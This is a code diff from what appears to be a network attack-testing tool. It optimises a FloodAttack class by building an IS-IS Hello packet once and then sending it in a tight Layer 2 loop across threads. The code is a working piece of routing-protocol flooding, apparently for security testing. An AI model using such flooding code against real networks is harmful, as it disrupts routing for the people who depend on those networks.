@@ -21,14 +21,15 @@ class FloodAttack(BaseAttack):
                 iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
             ))
         self._stop_event = threading.Event()
+        self._flood_pkt = build_iih_packet(
+            sys_id=self.config.sys_id, area_addr=self.config.area_addr,
+            src_mac=self._src_mac, level=self.config.level,
+        )
 
     def launch(self) -> AttackResult:
         def _flood_worker(sender):
+            pkt = self._flood_pkt
             while not self._stop_event.is_set():
-                pkt = build_iih_packet(
-                    sys_id=self.config.sys_id, area_addr=self.config.area_addr,
-                    src_mac=self._src_mac, level=self.config.level,
-                )
                 sender.send_l2(pkt)
 
         threads = []
